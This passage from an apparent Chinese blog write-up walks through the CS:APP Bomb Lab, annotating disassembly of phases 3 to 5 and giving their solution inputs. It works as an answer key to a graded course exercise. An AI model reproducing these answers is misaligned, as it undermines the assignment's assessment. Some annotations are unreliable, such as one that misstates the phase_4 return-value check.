class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400f</span>43 &lt;phase_3&gt;:<br>  <span class="hljs-number">400f</span>43:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">400f</span>47:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0xc</span>(%rsp),%rcx<br>  <span class="hljs-number">400f</span>4c:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0x8</span>(%rsp),%rdx<br>  <span class="hljs-number">400f</span>51:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x4025cf</span>,%esi<span class="hljs-comment">//还是通过gdb查看当前位置的值</span><br>  <span class="hljs-number">400f</span>56:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">400f</span>5b:e8 <span class="hljs-number">90</span> fc ff ff       callq  <span class="hljs-number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;<br>  <span class="hljs-number">400f</span>60:<span class="hljs-number">83</span> f8 <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0x1</span>,%eax<span class="hljs-comment">//判断返回值，小于1就爆炸</span><br>  <span class="hljs-number">400f</span>63:<span class="hljs-number">7f</span> <span class="hljs-number">05</span>                jg     <span class="hljs-number">400f</span>6a &lt;phase_3+<span class="hljs-number">0x27</span>&gt;<br>  <span class="hljs-number">400f</span>65:e8 d0 <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>6a:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span>       cmpl   $<span class="hljs-number">0x7</span>,<span class="hljs-number">0x8</span>(%rsp)<span class="hljs-comment">//判断输入的第一个数是否大于7，大于7就爆炸。</span><br>  <span class="hljs-number">400f</span>6f:<span class="hljs-number">77</span> <span class="hljs-number">3</span>c                ja     <span class="hljs-number">400f</span>ad &lt;phase_3+<span class="hljs-number">0x6a</span>&gt;<br>  <span class="hljs-number">400f</span>71:<span class="hljs-number">8b</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rsp),%eax<span class="hljs-comment">//将输入的第一个数存在%eax中</span><br>  <span class="hljs-number">400f</span>75:ff <span class="hljs-number">24</span> c5 <span class="hljs-number">70</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> jmpq   *<span class="hljs-number">0x402470</span>(,%rax,<span class="hljs-number">8</span>)<span class="hljs-comment">//这里就是根据第一个输入的数，选择跳转的地址</span><br>  <span class="hljs-number">400f</span>7c:b8 cf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0xcf</span>,%eax<span class="hljs-comment">//如果第一个输入的数为0，就跳转到这里，移入一个数</span><br>  <span class="hljs-number">400f</span>81:eb <span class="hljs-number">3b</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>83:b8 c3 <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x2c3</span>,%eax<br>  <span class="hljs-number">400f</span>88:eb <span class="hljs-number">34</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>8a:b8 <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x100</span>,%eax<br>  <span class="hljs-number">400f</span>8f:eb <span class="hljs-number">2</span>d                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>91:b8 <span class="hljs-number">85</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x185</span>,%eax<br>  <span class="hljs-number">400f</span>96:eb <span class="hljs-number">26</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>98:b8 ce <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0xce</span>,%eax<br>  <span class="hljs-number">400f</span>9d:eb <span class="hljs-number">1f</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>9f:b8 aa <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x2aa</span>,%eax<br>  <span class="hljs-number">400f</span>a4:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>a6:b8 <span class="hljs-number">47</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x147</span>,%eax<br>  <span class="hljs-number">400f</span>ab:eb <span class="hljs-number">11</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>ad:e8 <span class="hljs-number">88</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>b2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">400f</span>b7:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">400f</span>be &lt;phase_3+<span class="hljs-number">0x7b</span>&gt;<br>  <span class="hljs-number">400f</span>b9:b8 <span class="hljs-number">37</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x137</span>,%eax<br>  <span class="hljs-number">400f</span>be:<span class="hljs-number">3b</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span>c          cmp    <span class="hljs-number">0xc</span>(%rsp),%eax<span class="hljs-comment">//判断第二个输入的数与跳转后移入的数是否相等，不等就爆炸</span><br>  <span class="hljs-number">400f</span>c2:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400f</span>c9 &lt;phase_3+<span class="hljs-number">0x86</span>&gt;<br>  <span class="hljs-number">400f</span>c4:e8 <span class="hljs-number">71</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">400f</span>c9:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          add    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">400f</span>cd:c3                   retq   <br></code></pre></td></tr></table></figure><p><img src="/images/lab23.png"> 发现这次只需要输入两个整数即可。<br><img src="/images/lab24.png">我们可以通过这个操作得出跳转表。</p><p>我们第一个数可以输入0-7，第二个数就可以根据第一个数，然后根据跳转表，输入相应的第二个数就可以过关！</p><p>因此可以得出这个阶段的答案有8种，任选其一。分别为（0，207）、（1，311）、（2，707）、（3，256）、（4，389）、（5，206）、（6，682）、（7，327）。</p><h4 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">000000000040100</span>c &lt;phase_4&gt;:<br>  <span class="hljs-number">40100</span>c:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">401010</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0xc</span>(%rsp),%rcx<br>  <span class="hljs-number">401015</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0x8</span>(%rsp),%rdx<br>  <span class="hljs-number">40101</span>a:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x4025cf</span>,%esi<span class="hljs-comment">//还是输入两个数</span><br>  <span class="hljs-number">40101f</span>:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">401024</span>:e8 c7 fb ff ff       callq  <span class="hljs-number">400b</span>f0 &lt;__isoc99_sscanf@plt&gt;<br>  <span class="hljs-number">401029</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">02</span>             cmp    $<span class="hljs-number">0x2</span>,%eax<span class="hljs-comment">//如果返回值为2，就爆炸</span><br>  <span class="hljs-number">40102</span>c:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401035</span> &lt;phase_4+<span class="hljs-number">0x29</span>&gt;<br>  <span class="hljs-number">40102</span>e:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">0</span>e       cmpl   $<span class="hljs-number">0xe</span>,<span class="hljs-number">0x8</span>(%rsp)<span class="hljs-comment">//第一个数要小于等于14否则就爆炸</span><br>  <span class="hljs-number">401033</span>:<span class="hljs-number">76</span> <span class="hljs-number">05</span>                jbe    <span class="hljs-number">40103</span>a &lt;phase_4+<span class="hljs-number">0x2e</span>&gt;<br>  <span class="hljs-number">401035</span>:e8 <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">40103</span>a:ba <span class="hljs-number">0</span>e <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0xe</span>,%edx<br>  <span class="hljs-number">40103f</span>:be <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%esi<br>  <span class="hljs-number">401044</span>:<span class="hljs-number">8b</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0x8</span>(%rsp),%edi<br>  <span class="hljs-number">401048</span>:e8 <span class="hljs-number">81</span> ff ff ff       callq  <span class="hljs-number">400f</span>ce &lt;func4&gt;<br>  <span class="hljs-number">40104</span>d:<span class="hljs-number">85</span> c0                test   %eax,%eax<span class="hljs-comment">//检测返回值，不是0就爆炸，所以返回值必须为0</span><br>  <span class="hljs-number">40104f</span>:<span class="hljs-number">75</span> <span class="hljs-number">07</span>                jne    <span class="hljs-number">401058</span> &lt;phase_4+<span class="hljs-number">0x4c</span>&gt;<br>  <span class="hljs-number">401051</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c <span class="hljs-number">00</span>       cmpl   $<span class="hljs-number">0x0</span>,<span class="hljs-number">0xc</span>(%rsp)<span class="hljs-comment">//判断第二个数是否为0， 为0就结束，否则爆炸</span><br>  <span class="hljs-number">401056</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">40105</span>d &lt;phase_4+<span class="hljs-number">0x51</span>&gt;<br>  <span class="hljs-number">401058</span>:e8 dd <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">40105</span>d:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">18</span>          add    $<span class="hljs-number">0x18</span>,%rsp<br>  <span class="hljs-number">401061</span>:c3                   retq   <br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000400f</span>ce &lt;func4&gt;:<br>  <span class="hljs-number">400f</span>ce:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0x8</span>,%rsp<br>  <span class="hljs-number">400f</span>d2:<span class="hljs-number">89</span> d0                mov    %edx,%eax<span class="hljs-comment">//第三个参数为14（0xe）</span><br>  <span class="hljs-number">400f</span>d4:<span class="hljs-number">29</span> f0                sub    %esi,%eax<span class="hljs-comment">//第二个参数为0</span><br>  <span class="hljs-number">400f</span>d6:<span class="hljs-number">89</span> c1                mov    %eax,%ecx<br>  <span class="hljs-number">400f</span>d8:c1 e9 <span class="hljs-number">1f</span>             shr    $<span class="hljs-number">0x1f</span>,%ecx<span class="hljs-comment">//逻辑右移31位</span><br>  <span class="hljs-number">400f</span>db:<span class="hljs-number">01</span> c8                add    %ecx,%eax<br>  <span class="hljs-number">400f</span>dd:d1 f8                sar    %eax<span class="hljs-comment">//这条指令的意思就是算术右移一位</span><br>  <span class="hljs-number">400f</span>df:<span class="hljs-number">8</span>d <span class="hljs-number">0</span>c <span class="hljs-number">30</span>             <span class="hljs-built_in">lea</span>    (%rax,%rsi,<span class="hljs-number">1</span>),%ecx<span class="hljs-comment">//将求得的值移入到%ecx中，准备比较</span><br>  <span class="hljs-number">400f</span>e2:<span class="hljs-number">39</span> f9                cmp    %edi,%ecx<span class="hljs-comment">//和第一个输入的值进行比较</span><br>  <span class="hljs-number">400f</span>e4:<span class="hljs-number">7</span>e <span class="hljs-number">0</span>c                jle    <span class="hljs-number">400f</span>f2 &lt;func4+<span class="hljs-number">0x24</span>&gt;<span class="hljs-comment">//小于等于跳转</span><br>  <span class="hljs-number">400f</span>e6:<span class="hljs-number">8</span>d <span class="hljs-number">51</span> ff             lea    <span class="hljs-number">-0x1</span>(%rcx),%edx<br>  <span class="hljs-number">400f</span>e9:e8 e0 ff ff ff       callq  <span class="hljs-number">400f</span>ce &lt;func4&gt;<br>  <span class="hljs-number">400f</span>ee:<span class="hljs-number">01</span> c0                add    %eax,%eax<br>  <span class="hljs-number">400f</span>f0:eb <span class="hljs-number">15</span>                jmp    <span class="hljs-number">401007</span> &lt;func4+<span class="hljs-number">0x39</span>&gt;<br>  <span class="hljs-number">400f</span>f2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">400f</span>f7:<span class="hljs-number">39</span> f9                cmp    %edi,%ecx<br>  <span class="hljs-number">400f</span>f9:<span class="hljs-number">7</span>d <span class="hljs-number">0</span>c                jge    <span class="hljs-number">401007</span> &lt;func4+<span class="hljs-number">0x39</span>&gt;<span class="hljs-comment">//大于等于跳转，两者结合其实就是等于</span><br>  <span class="hljs-number">400f</span>fb:<span class="hljs-number">8</span>d <span class="hljs-number">71</span> <span class="hljs-number">01</span>             lea    <span class="hljs-number">0x1</span>(%rcx),%esi<br>  <span class="hljs-number">400f</span>fe:e8 cb ff ff ff       callq  <span class="hljs-number">400f</span>ce &lt;func4&gt;<br>  <span class="hljs-number">401003</span>:<span class="hljs-number">8</span>d <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span>          lea    <span class="hljs-number">0x1</span>(%rax,%rax,<span class="hljs-number">1</span>),%eax<br>  <span class="hljs-number">401007</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0x8</span>,%rsp<br>  <span class="hljs-number">40100b</span>:c3                   retq   <br></code></pre></td></tr></table></figure><p>上面<code>fun4</code>函数5-8行的代码就相当于 x = (x  &gt;&gt;  31  +  x) &gt;&gt; 1。</p><p>第一个参数为我们要输入的值，第二个参数为0，第三个为14；这样算出来如果第一个数为7，第二个数为0，就可以把这关过掉。</p><p><del>应该有其他答案，但我不会</del>，是个递归函数。</p><h4 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-number">0000000000401062</span> &lt;phase_5&gt;:<br>  <span class="hljs-number">401062</span>:<span class="hljs-number">53</span>                   push   %rbx<br>  <span class="hljs-number">401063</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">20</span>          sub    $<span class="hljs-number">0x20</span>,%rsp<br>  <span class="hljs-number">401067</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> fb             mov    %rdi,%rbx<br>  <span class="hljs-number">40106</span>a:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> mov    %fs:<span class="hljs-number">0x28</span>,%rax<span class="hljs-comment">//gcc做的一个栈保护检测机制</span><br>  <span class="hljs-number">401071</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-number">401073</span>:<span class="hljs-number">48</span> <span class="hljs-number">89</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    %rax,<span class="hljs-number">0x18</span>(%rsp)<br>  <span class="hljs-number">401078</span>:<span class="hljs-number">31</span> c0                <span class="hljs-keyword">xor</span>    %eax,%eax<br>  <span class="hljs-number">40107</span>a:e8 <span class="hljs-number">9</span>c <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40131b</span> &lt;string_length&gt;<span class="hljs-comment">//返回我们输入的字符串的长度</span><br>  <span class="hljs-number">40107f</span>:<span class="hljs-number">83</span> f8 <span class="hljs-number">06</span>             cmp    $<span class="hljs-number">0x6</span>,%eax<span class="hljs-comment">//必须为6，否则爆炸</span><br>  <span class="hljs-number">401082</span>:<span class="hljs-number">74</span> <span class="hljs-number">4</span>e                je     <span class="hljs-number">4010</span>d2 &lt;phase_5+<span class="hljs-number">0x70</span>&gt;<br>  <span class="hljs-number">401084</span>:e8 b1 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">401089</span>:eb <span class="hljs-number">47</span>                jmp    <span class="hljs-number">4010</span>d2 &lt;phase_5+<span class="hljs-number">0x70</span>&gt;<br>  <span class="hljs-number">40108b</span>:<span class="hljs-number">0f</span> b6 <span class="hljs-number">0</span>c <span class="hljs-number">03</span>          <span class="hljs-built_in">movzbl</span> (%rbx,%rax,<span class="hljs-number">1</span>),%ecx<span class="hljs-comment">//访问我们输入的6字节数组，取出一个字符传入%ecx中</span><br>  <span class="hljs-number">40108f</span>:<span class="hljs-number">88</span> <span class="hljs-number">0</span>c <span class="hljs-number">24</span>             mov    %cl,(%rsp)<br>  <span class="hljs-number">401092</span>:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">14</span> <span class="hljs-number">24</span>          <span class="hljs-built_in">mov</span>    (%rsp),%rdx<br>  <span class="hljs-number">401096</span>:<span class="hljs-number">83</span> e2 <span class="hljs-number">0f</span>             <span class="hljs-keyword">and</span>    $<span class="hljs-number">0xf</span>,%edx<span class="hljs-comment">//取字符的低四位</span><br>  <span class="hljs-number">401099</span>:<span class="hljs-number">0f</span> b6 <span class="hljs-number">92</span> b0 <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> movzbl <span class="hljs-number">0x4024b0</span>(%rdx),%edx<br>  <span class="hljs-number">4010</span>a0:<span class="hljs-number">88</span> <span class="hljs-number">54</span> <span class="hljs-number">04</span> <span class="hljs-number">10</span>          mov    %dl,<span class="hljs-number">0x10</span>(%rsp,%rax,<span class="hljs-number">1</span>)<span class="hljs-comment">//访问局部单字节数组，首地址在%rsp+10</span><br>  <span class="hljs-number">4010</span>a4:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">01</span>          add    $<span class="hljs-number">0x1</span>,%rax<br>  <span class="hljs-number">4010</span>a8:<span class="hljs-number">48</span> <span class="hljs-number">83</span> f8 <span class="hljs-number">06</span>          cmp    $<span class="hljs-number">0x6</span>,%rax<span class="hljs-comment">//循环</span><br>  <span class="hljs-number">4010</span>ac:<span class="hljs-number">75</span> dd                jne    <span class="hljs-number">40108b</span> &lt;phase_5+<span class="hljs-number">0x29</span>&gt;<br>  <span class="hljs-number">4010</span>ae:c6 <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">16</span> <span class="hljs-number">00</span>       movb   $<span class="hljs-number">0x0</span>,<span class="hljs-number">0x16</span>(%rsp)<br>  <span class="hljs-number">4010b</span>3:be <span class="hljs-number">5</span>e <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x40245e</span>,%esi<span class="hljs-comment">//同样可以查看该内存的值，得到的是“flyers”</span><br>  <span class="hljs-number">4010b</span>8:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">10</span>       lea    <span class="hljs-number">0x10</span>(%rsp),%rdi<br>  <span class="hljs-number">4010b</span>d:e8 <span class="hljs-number">76</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401338</span> &lt;strings_not_equal&gt;<br>  <span class="hljs-number">4010</span>c2:<span class="hljs-number">85</span> c0                test   %eax,%eax<br>  <span class="hljs-number">4010</span>c4:<span class="hljs-number">74</span> <span class="hljs-number">13</span>                je     <span class="hljs-number">4010</span>d9 &lt;phase_5+<span class="hljs-number">0x77</span>&gt;<br>  <span class="hljs-number">4010</span>c6:e8 <span class="hljs-number">6f</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-number">4010</span>cb:<span class="hljs-number">0f</span> <span class="hljs-number">1f</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       nopl   <span class="hljs-number">0x0</span>(%rax,%rax,<span class="hljs-number">1</span>)<br>  <span class="hljs-number">4010</span>d0:eb <span class="hljs-number">07</span>                jmp    <span class="hljs-number">4010</span>d9 &lt;phase_5+<span class="hljs-number">0x77</span>&gt;<br>  <span class="hljs-number">4010</span>d2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0x0</span>,%eax<br>  <span class="hljs-number">4010</span>d7:eb b2                jmp    <span class="hljs-number">40108b</span> &lt;phase_5+<span class="hljs-number">0x29</span>&gt;<br>  <span class="hljs-number">4010</span>d9:<span class="hljs-number">48</span> <span class="hljs-number">8b</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       mov    <span class="hljs-number">0x18</span>(%rsp),%rax<br>  <span class="hljs-number">4010</span>de:<span class="hljs-number">64</span> <span class="hljs-number">48</span> <span class="hljs-number">33</span> <span class="hljs-number">04</span> <span class="hljs-number">25</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">xor</span>    %fs:<span class="hljs-number">0x28</span>,%rax<br>  <span class="hljs-number">4010e5</span>:<span class="hljs-number">00</span> <span class="hljs-number">00</span> <br>  <span class="hljs-number">4010e7</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">4010</span>ee &lt;phase_5+<span class="hljs-number">0x8c</span>&gt;<br>  <span class="hljs-number">4010e9</span>:e8 <span class="hljs-number">42</span> fa ff ff       callq  <span class="hljs-number">400b</span>30 &lt;__stack_chk_fail@plt&gt;<br>  <span class="hljs-number">4010</span>ee:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">20</span>          add    $<span class="hljs-number">0x20</span>,%rsp<br>  <span class="hljs-number">4010f</span>2:<span class="hljs-number">5b</span>                   pop    %rbx<br>  <span class="hljs-number">4010f</span>3:c3                   retq    <br></code></pre></td></tr></table></figure><p><img src="/images/lab25.png"> 查看上面两个地址值，是两个字符串maduiersnfotvbyl</p><p>通过上面的分析，我们输入的字符串的低四位就作为下标来访问<code>0x4024b0</code>处的字符串<code>maduiersnfotvbyl</code>，必须和<code>flyers</code>相等，</p><p>所以我们输入的第一个字符的低四位必须是0x09，第二个必须是0x0f，后面依次是0x0e,0x05,0x06,0x07。答案足够多，可以任意组合。</p><h4 id="phsae-6-这个真的好难啊呜呜呜"><a href="#phsae-6-这个真的好难啊呜呜呜" class="headerlink" title="phsae_6   这个真的好难啊呜呜呜"></a>phsae_6   <del>这个真的好难啊呜呜呜</del></h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 